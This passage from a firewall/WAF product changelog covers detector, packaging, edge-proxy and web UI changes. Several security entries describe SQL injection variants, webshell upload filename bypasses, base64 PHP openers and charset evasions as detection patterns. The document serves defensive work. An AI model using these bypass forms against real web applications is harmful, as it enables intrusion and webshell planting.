    or Apache. The collector now also recognizes the current `litespeed` process
    name (not just the older `lshttpd`).
- **`cfm.api.conf` overlay now carries MaxMind credentials too, plus a shipped
  `cfm.api.conf.example`.** The per-server secrets overlay
  (`LoadConfigWithAPIOverride`) already overrode the cfm-web API `API_URL` /
  `AUTH_TOKEN`; it now also overlays `MAXMIND_ACCOUNT_ID` / `MAXMIND_LICENSE_KEY`
  (only when the overlay sets them), so the base `cfm.conf` can ship secret-free
  and identical on every host while a single `/etc/cfm/cfm.api.conf` holds the
  API + MaxMind secrets. Ships `configs/cfm.api.conf.example` (all values empty,
  so an un-edited file is inert — no reporting redirected to a real endpoint,
  GeoIP falls back to IPLocate); the deb/rpm post-install seeds
  `/etc/cfm/cfm.api.conf` (0600) from it on first install only (never overwrites
  an existing file; it is not a tracked conffile). The overlay is read at daemon
  **startup**, so edits need a `systemctl restart cfm` (documented in the file
  header), not just a reload.
  Runtime tokens (`CHALLENGE_TOKEN` / `OPENRESTY_TOKEN` / `SSLCOLLECTOR_SOCK_TOKEN`)
  still auto-generate on first boot, so they never need to be in the overlay.
  Covered by `TestLoadConfigWithAPIOverride_MaxMindAndAPI` /
  `…_APIOnlyOverlayKeepsBaseMaxMind`.
- **Startup log line for the forced-challenge vhost list (`CHALLENGE_VHOST`).**
  The webdetector now echoes the panic/bypass lists at config-load time —
  `forced-challenge vhosts (CHALLENGE_VHOST) loaded: count=N list=…`, plus
  companion lines for `CHALLENGE_VHOST_IGNORE` and `CHALLENGE_HOST_BYPASS` when
  set — mirroring the existing `challenge exclude loaded` line. Previously the
  forced list produced **no** startup output: the per-host bridge push is lazy
  (a `[nginx_bridge] vhost_challenge host=… reason=vhost_config` line appears
  only once a host matching the pattern actually receives traffic), so on a
  freshly-restarted, idle server `grep vhost /var/log/cfm/*` came back empty and
  read as a misconfiguration even though the list was loaded and active.
- **cfm-lsm event enrichment, Tier B (BPF wire fields).** The LSM event now
  carries the caller's parent tgid (`ppid`) read in-kernel at the instant it
  fired, plus — for `CFML-OBS-004` — the ptrace target's pid and euid
  (`aux_pid`/`aux_uid`). Two operator-visible wins: (1) the parent launcher
  (cron/script/controller) is resolved from the event `ppid` even when the
  short-lived caller has already exited by drain time (previously `proc=gone`
  meant no parent, since userspace can't read a dead process's `/proc`); (2)
  OBS-004 alerts show `target_pid=`/`target_uid=` alongside the target comm, so
  an operator can tell exactly which process was introspected and whether a
  cross-uid target was root or another tenant. The event struct grew from 112 to
  124 bytes (fields appended after `filename`); `common.bpf.h`, `events.go`, and
  the regenerated `.o` objects move in lockstep, and the Go parser accepts the
  112-byte base as a floor so it stays correct against an older pinned build
  during the version-marker refresh window.
- **cfm-lsm event enrichment — actionable alerts + a self-preserving forensic
  trail.** Every LSM detection now carries a best-effort `/proc` snapshot of the
  offending process, gathered in the drain path within milliseconds of the event
  (before a short-lived caller exits), folded into the `cfm.log` line and the
  notify email: `user` (uid→name), the **real** `exe` path (+ `(deleted)` flag —
  `comm` is spoofable, the exe inode is not), **SHA-256** of the exe (VirusTotal-
  ready, works on unlinked binaries), `cwd`, `cmdline`, `ppid`+parent `comm`/`exe`,
  and `loginuid`. Two further layers: **`enrich_peers`** appends the *uid swarm
  roster* — every process sharing the caller's real uid with its pid/comm/real-exe,
  so a compromised account's whole set of spoofed-comm processes (all typically
  pointing at one dropped binary) is captured while those pids still exist; and
  **`enrich_capture`** copies suspicious binaries (already-deleted, or under
  `/tmp`,`/var/tmp`,`/dev/shm`,`/run`,`/home`) out of `/proc/<pid>/exe` into
  `capture_dir` (default `/var/lib/cfm/lsm/capture`, `<sha256>.bin`, root-only,
  never executed, deduplicated, bounded) so a self-deleting dropper is preserved
  for analysis. All four knobs live under `[events]` in `lsm.conf` and **default
  ON** (a pre-existing conf inherits them on upgrade — no edit needed). Snapshots
  are cached per caller pid and rosters per uid, so a burst does the `/proc` work
  (incl. hashing and the full scan) once.
- **cfm-lsm alert-flood fix (fold into the above).** For the ptrace sweep policy
  `CFML-OBS-004` — which fires once per (caller, target) pair as a `pgrep`-style
  tool walks `/proc` — the notify email *reason* is now caller-identity-stable
  (uid + comm + exe, no pid, no per-target `ptrace`/`sameuid` tag), so the existing
  notify deduper collapses a whole sweep into a **single email** instead of one
  per target (previously the target + pid were in the dedup key, so a sweep
  produced up to the per-policy cap in emails). The collapse is scoped to that
  sweep policy: discrete-action policies (`FS-005`, `CRED-002`, `EXEC-*`) keep one
  email per target and keep the target/pid in the notify JSONL audit. The
  per-target detail, swarm roster, and captured-binary references ride in the
  email's **Sample lines** and the `Extra` map; `cfm.log` keeps the full
  per-event line. Enrichment is also gated behind the per-policy rate cap (a
  rate-dropped event does no `/proc` work) and all emitted fields are sanitised
  against log/email injection.
- **Web detector observability:** per-IP / subnet challenge **issuance** is now
  logged to `cfm.challenges.log` as `[challenge_issued] ip=… host=… rule=… ttl=…`
  (gated by `ChallengeLog`, like every other `[challenge]*` line). Previously an
  *issued-but-unsolved* challenge left no greppable trace — that log only records
  **solves** (keyed by the solver), and vhost-wide trips log under `host=`, not
  the client IP — so `grep <ip> cfm.challenges.log` for a challenged-but-non-JS
  client (API integrations, prefetch proxies, scanners) came back empty and the
  reason lived only in the webdetector history. De-duplicated to one line per
  `(ip, rule)` window (refreshes while a challenge stays active don't re-log), so
  it's greppable without being noisy.

### Fixed
- **Packaging (.deb): six `/etc/cfm` config files were not registered as
  `conffiles`, so `dpkg` silently overwrote operator edits on every upgrade.**
  The `.deb` ships 16 files under `/etc/cfm`, but `debian/DEBIAN/conffiles`
  listed only 10 — a file under `/etc` that dpkg installs but that is *not* a
  conffile is treated as a regular file and **replaced unconditionally on
  upgrade** (no prompt, no `.dpkg-dist` backup). The six unprotected files were
  `webdetector_challenge_exclude.txt`, `webdetector_challenge_paths.txt`,
  `webdetector_malpaths.txt`, `cfm.ignore`, `cfm.dnat_bypass` and
  `cfm.dnat_cpanel_bypass` — all operator-tuned lists, so a Debian/Ubuntu
  upgrade wiped local customisations (e.g. a hand-edited challenge-exclude or
  DNAT-bypass list). The RPM already protects all 16 with `%config(noreplace)`;
  the six are now added to `conffiles` so the `.deb` matches — dpkg keeps the
  operator's version and parks the new default as `.dpkg-dist`. RPM users were
  never affected. (Verified: `conffiles` == the deb-staged `/etc/cfm` set ==
  the RPM `%config` set — 16 each.)
- **Edge → bridge RPC (`cfm.lua`):** removed a ~300 ms stall on every edge→daemon
  call that returns an empty body (`Content-Length: 0`) — the WAF autoblock
  **push** and the block/clear calls (`/nginx/ip`, `/nginx/vhost`). (`observe`
  and `ok-touch` return a small JSON body, so they were never affected.)
  `http_unix` read the response body with a fall-through `receive("*a")`, which
  on the keep-alive
  bridge socket blocks until the read timeout (`CFM_DECISION_TIMEOUT_MS`, default
  300 ms) because the daemon never closes the connection; an explicit
  `Content-Length: 0` is now short-circuited to an empty body. Under a
  WAF-tripping flood each distinct `(ip, reason)` push tied up an nginx worker
  light-thread for ~300 ms of blocked time — the source of the intermittent "lua
  tcp socket read timed out" seen under only modest load. No behaviour change for
  non-empty responses (decision JSON, chunked). Found by the 2026-07 edge Lua
  audit (F04).
- **WAF (rule 606, `WAF_HTTP_SMUGGLING`, logonly): the request-line-smuggling
  detector never fired.** It was doubly dead: the verb match used
  `sl:match("(get|post|…)…")` (Lua has no `|` alternation, so it matched the
  literal string), AND the pre-filter tested the raw string for lowercase
  `" http/"` while a smuggled request line is normally uppercase
  `"GET … HTTP/1.1"`. The string is now lowercased first, then each known method
  is tested at a word boundary (`%f[%a]verb%s+[^%s]+%s+http/%d`). Stays
  **logonly** (observe-only). Covered by
  `scripts/tests/cfm_waf_backtick_smuggling_test.lua`. Found by the 2026-07 edge
  Lua audit (F12).
- **Web detector:** machine-to-machine API endpoints are no longer caught by a
  *vhost-wide* challenge. When a vhost trips the auto-suspicious-vhost score
  (`CHALLENGE_SUSPICIOUS_VHOST_SCORE` / `CHALLENGE_VHOST`), **every** request to
  the host was challenged regardless of path — silently breaking non-browser
  integrations that cannot solve the JS challenge (e.g. the v-track WooCommerce
  order sync: `/wp-json/wc/v3/orders/` got the HTML challenge instead of JSON
  during each ~35-min auto-on window, so orders stopped syncing intermittently).
  The `/nginx/decision` handler now exempts a **narrow, high-confidence** set
  from the vhost-wide challenge — WooCommerce REST (`/wp-json/wc*`, `/wc-api/`),
  payment-gateway webhooks/IPN, and the `/ws_vtrack/` plugin path. Deliberately
  much tighter than the score-exemption list (`isMachineStyleEndpointGo`), and
  applied **only** when the IP itself is not individually challenged/blocked —
  per-IP autoblock and the WAF rule engine still inspect these paths, so an
  attacker on them is still caught. Matching is substring (tolerates WP/Woo
  installed under a path prefix and the `//` form the edge forwards) with a
  path-traversal guard (`..` / `%2e` fail closed), so a token can't be decorated
  to slip a request that resolves to a different origin target past the challenge. (The reason was only visible via the
  `[challenge][vhost] action=auto_on host=…` line — keyed by host, not client
  IP — which is why a `grep <ip>` of the CFM logs came back empty.)

### Added
- Reference **challenge-exclude** ships a *VPN by Google / Chrome prefetch-proxy*
  entry (`configs/webdetector_challenge_exclude.txt`, section 9). Shared-egress
  `/24`s under `*.googlezip.net` (AS15169) were tripping the behavioural
  `CHALLENGE_SUBNET` heuristic — many real users behind one `/24` read as a
  scanner — and the non-JS prefetch proxy can never solve the interactive
  challenge, so it looped invisibly: an *issued-but-unsolved* challenge writes
  no `cfm.challenges.log` line (that log only records solves), and the reason
  lived only in the webdetector history as `challenge_issued reason=CHALLENGE_SUBNET`.
  Ships as two belt-and-suspenders rules (PTR+FCrDNS gold-standard, plus an
  ASN+PTR robust fallback). **Challenge-suppression only** — the WAF rule engine
  (SQLi/RCE/upload/webshell → 403) stays fully armed for these IPs.
- WAF rule **319 `rule_sqli_union_variant`** (`WAF_SQLI_UNION_VARIANT`) at
  **`logonly`** — observe-only detection of obfuscated UNION injection that
  rule 301's *adjacent* `union select` match misses: `union all select`,
  `union distinct select`, `union(select`, and comment-collapsed forms
  `union/**/select` → `unionselect` and `union/**/all|distinct/**/select` →
  `unionallselect`/`uniondistinctselect`. Runs on the same comment-stripped,
  `+`/whitespace-collapsed scan string as 301 and carries the identical
  value-terminator guard (the `union` must follow a value break `[%d'"%)]` or
  a `null`/`true`/`false` operand), so legit prose like *"credit union all
  selected"* / *"european union distinct selection"* does not fire. Shipped
  `logonly` for a multi-day real-traffic burn-in before any promotion; the
  `waf_security` autoblock family stays un-armed (default `0`) while logonly.
  Go registry (`waf_rule_ids.go`) and Lua (`cfm_waf.lua`) mirror the new rule;
  covered by `TestWAFSecurityFamilyCoverage` and
  `scripts/tests/cfm_waf_sqli_test.lua` (7 TP obfuscated-UNION + FP prose
  negatives). Found by the 2026-07 edge Lua audit.

### Security
- WAF / challenge excludes: **a non-glob host or path exclude no longer matches
  by plain substring**, which silently disabled protection on unintended
  vhosts/paths. Both the log-driven Go matcher
  (`internal/webdetector/exclude_store.go` `compiledValueMatcher`, which used
  `strings.Contains`) and the in-path Lua matcher (`cfm_waf_excl.lua`
  `matches_rule`, which used `value:find`) meant a `shop.gr` **host** exclude
  also switched the WAF/challenge off for `myshop.gr`, `shop.gr.evil.com`,
  `evil-shop.gr`, and a `/api` **path** exclude covered `/therapy`. Non-glob
  values now match at a boundary, identically in Go and Lua: a host matches
  **exactly or as a dot-boundary subdomain** (`shop.gr` → `shop.gr`,
  `www.shop.gr`; NOT `myshop.gr` / `shop.gr.evil.com`) and a path **exactly or
  as a path-segment prefix** (`/admin` → `/admin`, `/admin/x`; NOT
  `/administrator`). Globs (`*`/`?`) are unchanged. The host semantics now agree
  with `matchHostExclude` (the reporting-side matcher the enforcement path had
  silently diverged from). **Behaviour change for existing excludes**: a
  substring-reliant entry (e.g. `shop` to cover `shop.gr`+`myshop.gr`, or
  `/admin` to cover `/administrator`) must be re-expressed as a glob (`*shop*`,
  `/admin*`) or listed explicitly. The Lua matcher moved to `cfm_waf_excl.lua`
  for unit-testability; Go and Lua are cross-checked to agree. Found by the
  2026-07 edge Lua audit.

### Fixed
- WAF (rule 604, `WAF_CT_ANOMALY:CT_CHARSET_BYPASS`, challenge): **stopped
  challenging legitimate non-Latin form/API POSTs.** The Content-Type charset
  allowlist — which exists to flag a charset the WAF can't decode but the
  backend can (EBCDIC/IBM037, UTF-7, UTF-16), a real evasion vector — held only
  Latin + Chinese, so a Greek (`iso-8859-7`, `windows-1253`) or any other
  national-charset POST was challenged (rule 604). The allowlist now admits any
  **ASCII-superset** charset — the only property that matters here, since the
  exploit metacharacters `< > ' " ( ) ;` live in 0x00–0x7F and map to ASCII
  unchanged, so the WAF and the backend see identical bytes: every `iso-8859-*`
  and `windows-125x` national charset (Greek, Cyrillic, Hebrew, Arabic, Turkish,
  Baltic, Vietnamese), KOI8, TIS-620, and the ASCII-compatible CJK multibyte
  encodings (shift_jis/big5/euc-*). EBCDIC, UTF-7 and UTF-16/32 stay flagged, as
  do unknown charsets (fail-safe allowlist) — verified old-vs-current. The
  charset value is now also read from a **quoted** form (`charset="ibm037"`), so
  a dangerous charset can no longer dodge the check by quoting, and the capture
  accepts `_` so `shift_jis`/`ks_c_5601-1987` are recognised. Found by the
  2026-07 edge Lua audit.

### Security
- WAF (rule 401, `WAF_UPLOAD_FNAME`, block + autoblock): **closed four upload
  webshell bypasses in Content-Disposition filename extraction.** (1) The
  filename was extracted with a case-SENSITIVE `[Ff]ilename` token, but the
  parameter name is case-insensitive (PHP's rfc1867 parser uses `strcasecmp`) —
  so `FileName="shell.php"` (capital `N`), `FILENAME=`, `fileName=` were honoured
  by the backend yet matched none of the patterns, so `bad_fname` never ran and
  **every** extension matcher was skipped. (2) The RFC 5987 / 6266 extended
  parameter `filename*=charset'lang'pct-value` (honoured by ASP.NET/IIS
  `FileNameStar`) was not matched at all. (3)/(4) PHP's `php_ap_getword_conf`
  (shared by cPanel/LiteSpeed lsphp) honours a `\"` escaped quote and even an
  UNTERMINATED opening quote, so `filename="shell\".php"` and `filename="shell.php`
  <CRLF> delivered a `.php` the precise `"([^"]+)"` patterns under-read. Fixes:
  the token is matched case-insensitively; a dedicated `filename*=` loop strips
  the `charset'lang'` prefix and percent-decodes once (mirroring the server); and
  an end-of-Content-Disposition-line backstop hands the whole value to the
  anchored extension matchers when the precise quote patterns miss. Verified
  old-vs-current: the shipped code missed all four bypass classes; the fix blocks
  them while leaving benign uploads untouched — a legit `filename*=…holiday%20`
  `photo.jpg`, a field literally named `filename`, and the anchoring FP fixes
  (`vendor.jspdf.min.js`, `company.pharma.pdf`) still pass, since the backstop
  relies on the same leading-dot + `[^%w]`/`$` anchoring. Found by two adversarial
  review passes over the rule-401 extension-anchoring fix.
- WAF (rule 401, `WAF_UPLOAD_FNAME`, block + autoblock): **fixed unanchored
  upload-extension matchers that banned legitimate uploaders.** The
  server-side-handler extensions `.phar` `.asp[x]` `.asa[x]` `.asmx` `.ascx`
  `.jsp[x]` `.cer` `.cdx` were matched as bare substrings
  (`fname:match("%.phar")` …), so a benign filename that merely *contained* one
  mid-word tripped the rule — `.phar`⊂`company.pharma.pdf`,
  `.asp`⊂`trip.aspen.jpg`, `.asa`⊂`team.asana.csv`, `.jsp`⊂`vendor.jspdf.min.js`
  (a very common library bundle), `.cer`⊂`vase.ceramic.jpg`. Because rule 401 is
  block **and** autoblock-armed, that was a hard 403 **plus a 6h nftables IP
  ban** of a real customer. They are now anchored exactly like the adjacent
  `.php`/`.phtml`/`.pht` matchers — `%.EXT[^%w]` (a further `.ext`/separator) or
  `%.EXT$` (end) — so a real trailing extension and the `shell.asp.jpg`
  double-extension are still caught while the mid-word substring is not. The
  `.cer[^t]` guard (which kept `.cert` out) is subsumed by `[^%w]`. Verified by
  an old-vs-current comparison: the anchored rule blocks the **identical** set
  of malicious uploads (15/15, incl. trailing-space/dot/`::$DATA`/NUL/tab and
  double-extension evasions) while no longer false-positive-banning five
  classes of benign file. Found by the 2026-07 edge Lua audit.
- WAF (rule 301, `WAF_SQLI`, block): **closed a first-try block-tier SQLi
  bypass via `+`-encoded spaces.** The tautology signatures (`union select`,
  ` or 1=1`, `' or '1'='1`) were matched against the scan string with `+`
  preserved (`sc`), while a browser/form sends a space as `+` and PHP
  (`parse_str`/`$_GET`/`$_POST`) decodes `+`→space before the SQL runs — so
  `?id=1+union+select+…` reached the database as `1 union select` yet evaded
  the WAF, even though the `%20`/literal-space forms were caught. These
  tokens now match against the `+`/whitespace-collapsed scan string (`scw`),
  which also folds double separators (`union%20%20select`, `union++select`)
  that a single-space substring test missed. `UNION SELECT` additionally
  gained a value-terminator guard — a **digit, quote, or close-paren** (or
  string start) immediately before `union` — so that collapsing `+`→space
  does not turn the signature into a bare two-word substring that would block
  legitimate English where "union" is a noun (`credit union select account`,
  `trade union selection`, `european union select committee`) at block tier;
  real UNION injection breaks out of an existing value first and the common
  `?id=1+union+select` form carries the value's trailing **digit** as that
  terminator. `=`, `/` and `,` are deliberately excluded from the class to
  avoid FPs on value-leading nouns (`?q=union+select+board` "Union Select
  Board", `?q=union+selectmen`), legit paths (`/union+selected+news`) and CSV
  values — at the cost of the rare bare-value `?id=union+select` form. SQL
  keyword-literal operands (`null`/`true`/`false`) also break out of an
  unquoted value without a digit/quote/paren (`?id=null+union+select`,
  `?enabled=true+union+select`, `1 is null union select`) and end in a letter,
  so they are matched explicitly — the shipped substring check caught these, so
  the terminator gate would have regressed on them. `' or '1'='1` (quoted) and
  ` or 1=1` (leading space) are FP-safe on the collapsed string as-is; the
  `%`-encoded fallbacks and the `+`-literal `=0+0+0+1` tail are untouched. Regression + FP-negative tests added to
  `cfm_waf_sqli_test.lua`, each verified to fail on the pre-fix/pre-guard
  forms. Scope note: this closes the `+`-encoding bypass of the existing
  adjacent-`union select` signature only; the pre-existing keyword/separator
  evasions (`union all select`, `union distinct select`, `union(select`,
  `union/**/select`) remain and are tracked for a dedicated,
  FP-burn-in'd rewrite. Found by the 2026-07 edge Lua audit.

### Added
- Edge proxy: **opt-in origin keepalive** (`detectors.conf [webdetector]
  ORIGIN_KEEPALIVE = 1` — the single switch, published to the edge via
  `cfm_bridge_config.lua` and picked up within ~10s, no proxy reload) —
  allow-traffic routes through new `cfm_origin_http`/`cfm_origin_https`
  upstream pools (`configs/lua/cfm_origin_ka.lua`, balancer_by_lua) instead
  of opening a fresh TCP connection — plus a full upstream TLS handshake on
  443 — to Apache for every request. Safety: routing engages only when the
  live proxy conf declares the pools (`$cfm_origin_ka_conf` sentinel in the
  current `openresty.conf`/`angie.conf`), so arming the knob against an
  older live conf is a no-op rather than a 502 storm. Port 80 is always
  pooled (Host-header vhost routing); port 443 is pooled only when
  lua-resty-core supports SNI-keyed pools (OpenResty 1.27.1.1+), otherwise
  it falls back to per-request connections so a connection handshaked for
  one SNI is never reused for another vhost (no Apache 421s on shared
  boxes); an engine build without balancer-keepalive FFI support (possible
  on some Angie module builds) degrades once-per-worker to per-request
  connections with a WARN instead of erroring. Keepalive races are covered:
  one `set_more_tries(1)` retry per request replaces the default upstream
  retry that balancer_by_lua disables. Tunables: `ORIGIN_KEEPALIVE_IDLE_SEC`
  (default 3, keep below Apache `KeepAliveTimeout`, clamped 1-60),
  `ORIGIN_KEEPALIVE_MAX_REQS` (default 1000). Default OFF — zero behaviour
  change until an operator opts in. See `docs/proxy-performance.md` for the
  measurement + rollout recipe.
- Edge proxy: **client TLS session resumption** — `ssl_session_cache
  shared:cfm_ssl:20m` + `ssl_session_timeout 4h` at the `http {}` level of
  both engine configs (panel listeners inherit). Reconnecting clients
  (mobile especially) skip the full TLS handshake; previously no session
  cache was configured at all.
- Edge proxy: **latency-split instrumentation** in the `cfm` access-log
  format: `uct=` (`$upstream_connect_time` — TCP+TLS to Apache, the number
  origin keepalive collapses), `uht=` (`$upstream_header_time`), `sslr=`
  (`$ssl_session_reused` — client resumption ratio), and `luams=`
  (`$cfm_lua_ms`, new per-request variable stamped by cfm.lua with the
  access-phase wall-clock ms on origin-allow paths). Lets operators split
  the CFM hop into handshake / Lua / backend without guesswork.

### Fixed
- Edge proxy (cfm.lua): **eliminated 4–5 `loadfile()` disk reads per
  request.** The self-ips and ignore-nets caches carried 30s TTLs but their
  state lived in top-level locals, which re-initialise on every request
  under `access_by_lua_file` (the documented PITFALL), so the TTL check was
  a permanent miss; the bridge token, bridge config and clamav-toggle files
  were additionally `loadfile()`'d unconditionally per request. All five now
  go through `configs/lua/cfm_filecache.lua`, a require'd per-worker TTL
  cache (token/configs: 10s TTL; self-ips/ignore-nets: their existing 30s /
  2s-when-missing TTLs — now actually honoured). Behaviour is unchanged
  apart from the disk probes happening once per TTL window instead of once
  per request.
- Edge proxy (cfm_panel.lua): the panel listeners' bridge-config read had
  the same per-request `loadfile()` bug **and** was a second, drift-prone
  copy of the parse; it now goes through the canonical
  `cfm_bridge_cfg.lua` accessor (same 10s TTL as the main edge), so panel
  ports pick up daemon knob changes identically to web listeners.
- Edge proxy: **one bridge-token loader for the whole edge.**
  `cfm_bridge_cfg.token()` (cfm_filecache-backed, 10s TTL / 2s
  missing-retry) replaces four private load+validate copies: cfm.lua,
  cfm_panel.lua (which also re-read the file once per panel request),
  cfm_purge.lua, and cfm_h3_config.lua — the latter cached the token
  **forever** per worker, so a daemon-side token rotation left the HTTP/3
  config fetch 403-ing against the bridge until an nginx reload; it now
  converges within 10s like every other consumer. The validity rule
  (string, ≥32 chars) lives in one place. cfm_purge — the one INBOUND
  validator (it checks the token the daemon presents) — refreshes-on-
  mismatch so a force-unblock issued right after a startup token rotation
  is never 403'd by the 10s cache. (cfm_panel's install-preflight selftest
  still probes the raw token file on purpose — it validates the file
  itself.)
- internal/sslcollector: the four generated-Lua writers (token,
  sslcollector config, clamav config, webdetector bridge config) now share
  one `writeLuaFileAtomic` implementation of the tmp-write → 0640 →
  root:cfm chown → rename sequence, so a future fix to the enforced
  ownership/mode path lands in all writers at once. Error strings and log
  tags are preserved per writer; the two config writers additionally gained
  the final-chmod hardening the token writer already had.
- API: **bulk IP block endpoint with self-lockout guard** — admin-only
  `POST /api/v1/firewall/block/batch` (`{ips: […], ttl, reason}`, ≤256 IPs per
  request, same TTL semantics as the single endpoint: empty = permanent). Each
  IP is reported individually (`blocked` / `skipped` / `failed`) and the batch
  **skips — never blocks — the server's own IPs** (loopback, link-local, any
  interface-bound address, re-enumerated per request) **and the calling
  admin's own IP** (first `X-Forwarded-For` hop when the daemon sits behind
  the edge proxy on loopback, else the connection address), so a bulk
  select-all can't firewall you out of your own box. Audit-logged to `api.log`
  (`[block.batch]` summary + one line per self/caller skip). The web UI's
  "Block selected (N)" now sends one batch request per 256-IP chunk instead
  of a client-side loop of single blocks: skipped IPs are named in the result
  toast and unselected, transient failures stay selected for retry.
- WebUI (`/cfm-admin` webdetector pages): **bulk IP selection + bulk block.**
  The Global Top IPs and vhost-drilldown Top IPs tables now have a checkbox per
  row plus a select-all header checkbox, and clicking a row's **CC / ASN /
  company** value quick-selects every listed IP sharing it ("these 20 bots are
  all the same datacenter" in one click). A sticky action bar appears while
  anything is selected: **Block selected (N)** applies the page's Block TTL
  (including `permanent`, with a count-explicit confirmation) to all selected
  IPs, with live progress; failed IPs stay selected for retry and are named in
  the result toast. Selection deliberately survives auto-refresh and top-N
  rotation, so IPs picked during a bot storm stay picked while the list churns.
- WebUI (`/cfm-admin` webdetector pages): **selectable TTLs for the Block and
  Challenge actions** instead of the hardcoded 1h/30m. A **Block TTL** selector
  (`1h / 6h / 24h / 7d / permanent`) now drives every Block button on the page
  (Global Top IPs + vhost-drilldown Top IPs); **permanent** sends an empty TTL —
  an nft entry with no timeout, exactly like `cfm block <ip>` — and asks for
  confirmation first. A **Challenge TTL** selector (`30m / 1h / 2h / 6h / 24h`)
  drives the Challenge / Manual challenge buttons (`challenge/vhost/add`).
  Button labels and tooltips show the TTL that will be applied, and the action
  toast names it. No API change — both endpoints already accepted arbitrary
  TTLs; the UI just never exposed them.
- WebUI: the vhost-drilldown **Top IPs list is size-selectable (25 / 50 / 100)**
  — more rows to act on during a bot storm. The drilldown fetch now asks the
  server for its maximum (`top=100`) up front, so switching the selector never
  refetches. The waf/forensics/main pages previously hard-capped this list at
  12 rows; they now share the same selector (default 25).
- WAF → autoblock (**Phase 1**, ships DRY_RUN): a new **`waf_security`** detector
  turns the in-path WAF's per-hit stream into a persistent, cross-request
  **nftables** block via the shared detector framework — so a source that keeps
  tripping high-confidence WAF rules gets an L3/L4 ban that is queryable
  (`cfm which <ip>`), logged to `cfm.detectors.log`, reported to cfm-web, and
  emailed, instead of only being handled per-request at the edge. Wiring: a new
  `SubscribeWAFHitEvents` hook published from `Engine.RecordWAFTrigger` (the
  single per-hit choke point) feeding a per-IP-per-reason-family sliding-window
  counter. **Scoped to edge-`block` hits only** ("block at WAF → nft candidate"):
  the subscribe callback drops any hit whose edge action isn't `block`, so
  challenge/logonly hits never feed — this keys autoblock to what the WAF
  already blocked, rather than to a whole reason-family (a family such as
  `WAF_RCE` spans block rule 320 and logonly 322-327, and `WAF_BACKDOOR` has no
  block-tier rule at all). **Every WAF reason-family is a config knob** (key =
  family minus `WAF_`; the full ~40-family registry is covered automatically and
  guarded by a coverage test), but only the four families with an edge-`block`
  rule — `SQLI`, `RCE`, `UPLOAD_FNAME`, `UPLOAD_CONTENT` — can actually autoblock
  in Phase 1 and default to threshold 1; `BACKDOOR` is armed to 1 for when one
  of its rules is promoted to block. Every challenge/logonly family defaults to
  `0` and is inert until Phase 2. Per-rule-id overrides (`RULE_<id>`) win over
  the family threshold.
  Ships enforcing a **soft TTL block** (`BLOCK = "6h"`, self-healing) rather
  than a permanent ban; `DRY_RUN = 1` is available for a watch-first burn-in.
  `[waf_security.leniency]` gives GR/CY a 15m temp-ban + API + lenient blocklist
  instead of a farm-wide ban. Config in `configs/detectors.conf`; design in
  `docs/waf-autoblock-design.md`.

### Changed
- Challenge: **audit trail when an exclude suppresses a vhost challenge.** When
  the suspicious-vhost scorer WOULD flag a host but it is in the Challenge
  excludes, CFM now logs `[challenge][vhost] action=suppressed_by_exclude
  host=… would_reason=… uniqIP=… reasons=… note=host_in_challenge_excludes`
  (throttled to once per holddown window). This is the deliberate paper trail:
  an operator who excludes a host — or turns Challenge/WAF off for it at a
  customer's request — can show exactly what protection was declined ("we would
  have challenged N unique IPs on this vhost, but it's excluded") if that host
  later gets crawled/scraped. Also **relabelled the `CHALLENGE_VHOST` config-list
  push reason `manual` → `vhost_config`** in the challenge log: those pushes come
  from the config list every reconcile, not a human, and the `manual` label read
  as an operator having clicked it. A **genuine** operator/API manual challenge
  (from the `manualChal` store) still emits `reason=manual` — only the config-list
  push was relabelled — and the separate per-request manual/auto classification
  (`manual_active`) is unaffected.
- ClamAV upload scan: **only scan uploads the WAF let through** — the edge
  (`cfm.lua`) no longer fires `clamav.notify` on a request the WAF is about to
  **block** (`waf_action == "block"`). A WAF block already stops the malware at
  the edge, so scanning the same payload wasted ClamAV resources and produced a
  redundant infected-upload notification; the scan's value is the **rule-gap
  insight** (and alert) when a malicious upload slips *past* the WAF. Uploads
  that pass clean, or hit only a `logonly`/`challenge` rule, or arrive with the
  WAF failing to load (not-run, the module-load fallback), are still scanned
  exactly as before. No config change. **Deliberate tradeoff:** skipping the
  scan on WAF-blocked uploads also drops, for those requests, the infected-upload
  email as a compromised-account signal and the ClamAV-clean "second opinion"
  used to exonerate a WAF false-positive block — accepted, since a WAF block
  already stopped the payload and the scan's value is the pass-through rule-gap
  case.
- WAF: **split the encoded-`<?php` backdoor opener (rule 437) into two rule ids**
  — `rule_php_encoded_opener` (437, the URL/HTML-entity/JS-escape forms) and the
  new `rule_php_encoded_opener_b64` (438, the base64 `PD9waHA` form). One
  detector, routed by encoding. **Both stay at `challenge`; no behaviour change
  today** — this is an observability split so the two encodings can be tuned and
  measured independently. Rationale: the URL form is FP-prone (a browser
  url-encodes a user-typed `<?php` in any form field to `%3C%3Fphp`, so a legit
  blog comment / contact-form / paste POST fires it — `challenge` preserves and
  replays the POST, a hard `block` would 403 and drop it), whereas the base64
  form is attack-only (a browser never base64-encodes a form field; a 2026-07
  six-server review found 16/16 base64 openers were botnet POSTs of base64
  `<?php` to `/xmlrpc.php`, 0 FP). Rule 438 is the candidate for `block` after a
  1-2 week burn-in of the per-rule-id telemetry. **Operator note:** if you had
  customised `rule_php_encoded_opener` in `/etc/cfm/*` (a mode override, or a
  `--rule 437` per-vhost exclusion), it now covers only the URL/HTML/JS form —
  apply the same setting to `rule_php_encoded_opener_b64` / `--rule 438` for the
  base64 form. Also fixes a stale `DefaultMode` in `waf_rule_ids.go` (437 read
  `logonly` while the live Lua CFG had been `challenge` since 2026-06-25) and
  syncs `docs/waf.md` (the base64 `<?=`/`PD89` variant is intentionally *not*
  matched — the doc still listed it).

### Fixed
- Challenge: **dynamic "Challenge excludes" are now honoured by the vhost-wide
  challenge decision**, not only per-IP. The auto-suspicious-vhost scorer (and
  the `CHALLENGE_VHOST` list) previously consulted only the *static*
  `CHALLENGE_HOST_BYPASS` (`hostBypassed`), never the runtime UI/CLI/API exclude
  store (`MatchChallenge`, which is used only in the per-IP `isExcluded` path).
  So a host an operator explicitly excluded still got the **whole vhost**
  challenged the moment its suspicious score tripped, and adding the exclude did
  not clear an already-active auto-challenge (operator report: `www.gokids.gr`
  was excluded yet `auto_on reason=uniqip_on` challenged its visitors until the
  holddown expired). The dynamic exclude now wins over both the auto-suspicious
  path and the `CHALLENGE_VHOST` list, and clears any active vhost challenge on
  the next reconcile. Workaround on older builds: add the host to the static
  `CHALLENGE_HOST_BYPASS` (which the vhost path already honoured).
- Detectors: **`IGNORE_IPS`/`IGNORE_NETS` edge bypass no longer dies silently
  under a hardened daemon umask.** The Go mirror `WriteLuaCache` wrote
